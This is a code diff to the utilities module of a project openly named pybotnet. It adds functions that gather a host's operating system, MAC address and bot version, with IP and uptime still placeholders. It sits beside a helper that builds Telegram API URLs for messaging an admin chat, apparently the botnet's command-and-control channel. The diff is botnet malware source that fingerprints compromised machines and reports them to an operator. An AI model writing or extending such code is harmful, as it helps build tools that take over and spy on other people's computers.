@@ -1,11 +1,43 @@
 '''Common utilities'''
 
+# pybotnet modules
+import settings
+
 # import built-in & third-party modules
-from configs import TELEGRAM_TOKEN
 import requests
 import json
+import platform
 
+from uuid import getnode as get_system_mac_addres
 from bs4 import BeautifulSoup
+
+
+def get_short_system_info(start_time=None, logger=None) -> str:
+    '''pybotnet version, system mac addres, ip addres, operating system, pybotnet uptime'''
+
+    short_system_info = f"""
+pybotnet version: {settings.pybotnet_version}
+pybotnet up time: {None}
+operating system: {platform.system()}
+system mac addres: {get_system_mac_addres()}
+system global ip addres: {None}"""
+
+    return short_system_info
+
+
+def get_full_system_info(logger=None) -> str:
+    f'''return full system info: \n
+    get_short_system_info and system uptime, 
+
+    '''
+    full_system_info = f"""{get_short_system_info()}
+system uptime: {None}
+    """
+
+    return full_system_info
+
+
+print(get_full_system_info())
 
 
 def make_send_message_api_url(TELEGRAM_TOKEN, ADMIN_CHAT_ID, message) -> str:
